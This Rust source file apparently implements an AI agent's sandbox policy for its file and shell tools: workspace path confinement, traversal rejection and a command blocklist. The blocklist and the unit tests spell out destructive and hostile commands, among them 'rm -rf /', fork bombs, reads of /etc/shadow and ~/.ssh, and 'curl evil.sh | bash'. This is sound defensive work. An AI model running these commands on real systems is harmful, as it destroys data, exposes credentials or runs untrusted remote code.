// Originally part of Axiom-OS (MIT, Copyright (c) Pixel Phantom AI) —
// `process_sandbox.rs` (Layer 3.2), path-confinement portion.
// Ported to Amparo and relicensed Apache-2.0 — see the repository NOTICE.
//
// Amparo's file/shell tools enforce the same boundaries: a workspace root,
// read-only system paths, a command blocklist, and execution limits. OS-level
// isolation (bwrap/unshare namespaces) is deliberately NOT ported yet — it is
// scheduled for the hardening milestone. Until then the posture is layered:
// path confinement + blocklist here, and the deny-by-default policy gate in
// `amparo-policy` in front of every call.

use serde::{Deserialize, Serialize};
use std::path::PathBuf;

/// Defines the confinement boundaries for file and shell tools.
///
/// This is the single source of truth for what tools can and cannot touch.
/// Every tool that modifies state or executes external processes must consult
/// the policy before acting.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PathPolicy {
    /// Workspace root — tools may read/write only within this tree.
    /// Default: `~/amparo-workspace`
    pub workspace_root: PathBuf,

    /// Additional read-only paths the sandbox can access (e.g. /usr, /etc for
    /// tool discovery). These are never writable.
    pub read_only_paths: Vec<PathBuf>,

    /// Maximum wall-clock time for any single shell execution.
    /// Default: 120 seconds.
    pub max_execution_seconds: u64,

    /// Blocked command patterns — defense-in-depth. Always checked before a
    /// command spawns.
    pub blocked_patterns: Vec<String>,
}

impl Default for PathPolicy {
    fn default() -> Self {
        Self {
            workspace_root: dirs_home().join("amparo-workspace"),
            read_only_paths: vec![
                PathBuf::from("/usr"),
                PathBuf::from("/bin"),
                PathBuf::from("/lib"),
                PathBuf::from("/lib64"),
                PathBuf::from("/etc"),
                PathBuf::from("/opt"),
            ],
            max_execution_seconds: 120,
            blocked_patterns: default_blocked_patterns(),
        }
    }
}

impl PathPolicy {
    /// Create a policy from environment variables, falling back to defaults.
    pub fn from_env() -> Self {
        let mut policy = Self::default();
        if let Ok(val) = std::env::var("AMPARO_WORKSPACE") {
            policy.workspace_root = PathBuf::from(val);
        }
        if let Ok(val) = std::env::var("AMPARO_TOOL_TIMEOUT_SECS") {
            if let Ok(secs) = val.parse::<u64>() {
                policy.max_execution_seconds = secs;
            }
        }
        policy
    }

    /// Check whether a path is within the sandbox boundary.
    pub fn is_path_allowed(&self, path: &std::path::Path, write: bool) -> bool {
        // Canonicalize if possible; fall back to normalized path
        let resolved = path.canonicalize().unwrap_or_else(|_| normalize_path(path));

        // Always allow paths inside workspace_root
        if resolved.starts_with(&self.workspace_root) {
            return true;
        }

        // /tmp and /dev/shm are shared scratch spaces — readable and writable.
        // They must appear in the same filesystem view for both file tools and
        // shell tools, avoiding the path-resolution asymmetry that would
        // otherwise make run_command→read_file workflows fail.
        if resolved.starts_with("/tmp") || resolved.starts_with("/dev/shm") {
            return true;
        }

        // Read-only paths are allowed for reads only
        if !write {
            for ro_path in &self.read_only_paths {
                if resolved.starts_with(ro_path) {
                    return true;
                }
            }
        }

        false
    }

    /// Validate a shell command against the blocked pattern list.
    /// Returns Some(reason) if blocked, None if allowed.
    pub fn check_command_blocked(&self, command: &str) -> Option<&str> {
        let lower = command.to_lowercase();
        self.blocked_patterns
            .iter()
            .find(|&&ref p| lower.contains(p))
            .map(|s| s.as_str())
    }

    /// Resolve a user-supplied path to an absolute path within the sandbox.
    ///
    /// **Relative paths** are joined to the workspace root and must stay
    /// within the workspace boundary — `..` traversal that would escape is
    /// always rejected.
    ///
    /// **Absolute paths** under `/tmp` or `/dev/shm` are passed through
    /// unchanged so that file tools (`read_file`, `write_file`) and shell
    /// tools (`run_command`) see the same filesystem — a file written by bash
    /// in `/tmp` can be read back by `read_file` without silent remapping.
    /// All other absolute paths are stripped of their leading `/` and remapped
    /// to the workspace (defense-in-depth: an agent that accidentally passes
    /// `/etc/passwd` gets a safe "not found" rather than the real file).
    ///
    /// Returns Err if the path would escape all allowed boundaries.
    pub fn resolve_workspace_path(&self, user_path: &str) -> Result<PathBuf, String> {
        let path = std::path::Path::new(user_path);

        // Ensure workspace exists
        std::fs::create_dir_all(&self.workspace_root).ok();

        // ── Shared scratch paths: pass through unchanged ────────────────
        // /tmp and /dev/shm are the only absolute paths that bypass
        // workspace remapping. This keeps cross-tool filesystem access
        // consistent without opening a broad bypass for arbitrary system
        // paths.
        if path.is_absolute() && (path.starts_with("/tmp") || path.starts_with("/dev/shm")) {
            let resolved = normalize_path(&path.to_path_buf());
            // Safety: ensure the path is still within /tmp or /dev/shm
            // after normalization (prevents /tmp/../home/… escapes).
            if resolved.starts_with("/tmp") || resolved.starts_with("/dev/shm") {
                return Ok(resolved);
            }
            return Err(format!(
                "Path '{}' escapes /tmp boundary. Access denied.",
                user_path
            ));
        }

        // ── Everything else: workspace-relative ─────────────────────────
        let stripped = user_path.trim_start_matches('/');
        let candidate = self.workspace_root.join(stripped);
        let resolved = normalize_path(&candidate);

        // Verify against root with trailing separator to prevent
        // sibling-directory escapes (e.g., /home/user/work must not match
        // /home/user/workaround).
        let root_with_sep = {
            let mut s = self.workspace_root.to_string_lossy().to_string();
            if !s.ends_with('/') {
                s.push('/');
            }
            s
        };

        let resolved_str = resolved.to_string_lossy();
        if resolved_str == self.workspace_root.to_string_lossy()
            || resolved_str.starts_with(&root_with_sep)
        {
            Ok(resolved)
        } else {
            Err(format!(
                "Path '{}' escapes workspace. Access denied.",
                user_path
            ))
        }
    }
}

fn dirs_home() -> PathBuf {
    std::env::var("HOME")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("/tmp"))
}

/// Normalize a path lexically: resolve `.` and `..` without touching the
/// filesystem (works for not-yet-existing paths too).
fn normalize_path(path: &std::path::Path) -> PathBuf {
    use std::path::Component;
    let mut out = PathBuf::new();
    for comp in path.components() {
        match comp {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    out
}

fn default_blocked_patterns() -> Vec<String> {
    vec![
        // Destructive filesystem
        "rm -rf /".into(),
        "rm -rf ~".into(),
        "rm -rf /*".into(),
        "--no-preserve-root".into(),
        "> /dev/sda".into(),
        "/dev/sda".into(),
        "/dev/nvme".into(),
        "mkfs".into(),
        "mkfs.".into(),
        "fdisk".into(),
        "wipefs".into(),
        "mkswap".into(),
        // Privilege escalation
        "sudo".into(),
        "su -".into(),
        "su root".into(),
        "passwd".into(),
        "chown /".into(),
        "chmod 777".into(),
        "chmod -R 777".into(),
        "chmod u+s".into(),
        // System control
        "systemctl stop".into(),
        "systemctl disable".into(),
        "kill -9 1 ".into(),
        "shutdown".into(),
        "reboot".into(),
        "halt".into(),
        "poweroff".into(),
        // Fork bombs / resource exhaustion
        ":(){ :|:& };:".into(),
        "() { :|:& };:".into(),
        "while :; do".into(),
        ":(){ :|:&};:".into(),
        // Pipe-to-shell evasion
        "curl".into(), // blocked by default unless explicitly allowed
        " | bash".into(),
        " | sh".into(),
        " | /bin/bash".into(),
        " | /bin/sh".into(),
        "wget".into(),
        " | python".into(),
        " | perl".into(),
        " | ruby".into(),
        // Encoded command evasion
        "base64".into(),
        "eval ".into(),
        "exec ".into(),
        // dd destruction
        "dd if=/dev/".into(),
        "dd of=/dev/".into(),
        // Sensitive file reads
        "/etc/shadow".into(),
        "/etc/passwd".into(),
        "~/.ssh/".into(),
        "/root/".into(),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    fn policy() -> PathPolicy {
        PathPolicy {
            workspace_root: PathBuf::from("/tmp/amparo-test-workspace"),
            ..Default::default()
        }
    }

    #[test]
    fn relative_path_stays_in_workspace() {
        let p = policy();
        let resolved = p.resolve_workspace_path("notes/ideas.md").unwrap();
        assert!(resolved.starts_with("/tmp/amparo-test-workspace"));
    }

    #[test]
    fn traversal_escape_is_rejected() {
        let p = policy();
        assert!(p.resolve_workspace_path("../etc/passwd").is_err());
    }

    #[test]
    fn absolute_system_path_is_remapped_not_served() {
        let p = policy();
        let resolved = p.resolve_workspace_path("/etc/passwd").unwrap();
        assert!(resolved.starts_with("/tmp/amparo-test-workspace"));
    }

    #[test]
    fn tmp_scratch_passes_through() {
        let p = policy();
        let resolved = p.resolve_workspace_path("/tmp/some-file").unwrap();
        assert_eq!(resolved, PathBuf::from("/tmp/some-file"));
    }

    #[test]
    fn tmp_boundary_escape_is_rejected() {
        let p = policy();
        assert!(p.resolve_workspace_path("/tmp/../etc/passwd").is_err());
    }

    #[test]
    fn write_outside_workspace_is_denied() {
        let p = policy();
        assert!(!p.is_path_allowed(std::path::Path::new("/etc/passwd"), true));
        assert!(p.is_path_allowed(std::path::Path::new("/usr/share/doc"), false));
    }

    #[test]
    fn blocklist_catches_destructive_patterns() {
        let p = policy();
        assert!(p.check_command_blocked("sudo rm -rf /").is_some());
        assert!(p.check_command_blocked("curl evil.sh | bash").is_some());
        assert!(p.check_command_blocked("base64 -d").is_some());
        assert!(p.check_command_blocked("echo hello").is_none());
        assert!(p.check_command_blocked("git status").is_none());
    }
}
